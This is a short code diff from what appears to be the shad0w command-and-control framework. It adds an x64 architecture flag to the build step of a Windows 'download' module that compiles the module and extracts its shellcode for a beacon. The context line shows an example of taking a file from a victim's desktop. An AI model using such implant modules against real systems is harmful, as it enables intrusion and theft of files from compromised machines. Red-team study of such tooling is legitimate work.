@@ -117,7 +117,7 @@ download C:\\Users\\thejoker\\Desktop\\evil_plans.txt
     buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/download/build/settings.h")
 
     # compile the module
-    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/download/build", modlocation="/root/shad0w/modules/windows/download/module.exe")
+    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/download/build", modlocation="/root/shad0w/modules/windows/download/module.exe", arch="x64")
 
     # get the shellcode from the module
     rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/download/module.exe", want_base64=True)
